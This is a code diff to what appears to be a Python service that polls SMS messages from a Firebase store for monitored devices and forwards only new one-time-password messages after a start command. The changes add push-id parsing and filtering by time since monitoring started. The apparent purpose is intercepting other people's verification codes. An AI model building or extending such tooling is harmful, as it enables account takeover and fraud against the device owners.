@@ -292,6 +292,12 @@ def _message_leaf_key(record: dict[str, Any]) -> str | None:
 
 
 def _message_push_id(record: dict[str, Any]) -> int | None:
+    raw_id = record.get("push_id")
+    if raw_id is not None:
+        try:
+            return int(raw_id)
+        except (TypeError, ValueError):
+            pass
     leaf = _message_leaf_key(record)
     if not leaf:
         return None
@@ -299,6 +305,30 @@ def _message_push_id(record: dict[str, Any]) -> int | None:
         return int(leaf)
     except ValueError:
         return None
+
+
+def _monitoring_start_utc(profile: MonitorProfile) -> datetime | None:
+    started = profile.started_at
+    if not started:
+        return None
+    if started.tzinfo is None:
+        return started.replace(tzinfo=timezone.utc)
+    return started.astimezone(timezone.utc)
+
+
+def _record_is_after_monitoring_start(
+    record: dict[str, Any],
+    profile: MonitorProfile,
+) -> bool:
+    started = _monitoring_start_utc(profile)
+    if not started:
+        return True
+    received = record.get("received_at")
+    if not isinstance(received, datetime):
+        return False
+    if received.tzinfo is None:
+        received = received.replace(tzinfo=timezone.utc)
+    return received >= started
 
 
 def _messages_high_water(device: Device) -> int:
@@ -351,16 +381,19 @@ def _bump_messages_high_water(device: Device, push_id: int) -> None:
 def _should_deliver_otp_record(
     record: dict[str, Any],
     device: Device,
+    profile: MonitorProfile,
 ) -> bool:
-    """Only SMS after monitoring baseline — every new one, no gap skip among new."""
+    """New SMS only — watermark + time, so bad keys on some devices still deliver."""
     dedup = _record_dedup_key(record)
     if dedup in get_seen_sms_keys(device):
         return False
     push_id = _message_push_id(record)
-    if push_id is not None:
-        # Baseline watermark is fixed at /startmonitor; do not advance on delivery.
-        return push_id > _messages_high_water(device)
-    return _message_leaf_key(record) is not None
+    high_water = _messages_high_water(device)
+    if push_id is not None and push_id > high_water:
+        return True
+    if _record_is_after_monitoring_start(record, profile):
+        return True
+    return bool(_message_leaf_key(record)) and high_water <= 0
 
 
 def _looks_like_incoming_sms(sender: str, body: str) -> bool:
@@ -677,7 +710,16 @@ def _parse_sms_entry(firebase_key: str, value: Any) -> dict[str, Any] | None:
     if not sender:
         sender = "Unknown"
 
+    push_id_val: int | None = None
+    if value.get("id") is not None:
+        try:
+            push_id_val = int(value.get("id"))
+        except (TypeError, ValueError):
+            push_id_val = None
+
     received_at = None
+    if value.get("dateTime"):
+        received_at = _parse_timestamp(value.get("dateTime"))
     for field in TIME_FIELDS:
         if field in value:
             received_at = _parse_timestamp(value.get(field))
@@ -688,12 +730,15 @@ def _parse_sms_entry(firebase_key: str, value: Any) -> dict[str, Any] | None:
             if received_at:
                 break
 
-    return {
+    out: dict[str, Any] = {
         "firebase_key": firebase_key,
         "sender": sender,
         "message": body,
         "received_at": received_at,
     }
+    if push_id_val is not None:
+        out["push_id"] = push_id_val
+    return out
 
 
 _SKIP_SMS_NODE_KEYS = frozenset(
@@ -1308,7 +1353,7 @@ async def _poll_messages_otp_only(
 
     candidates: list[dict[str, Any]] = []
     for record in records:
-        if not _should_deliver_otp_record(record, device):
+        if not _should_deliver_otp_record(record, device, profile):
             continue
         sender = str(record.get("sender") or "Unknown")
         body = str(record.get("message") or "")
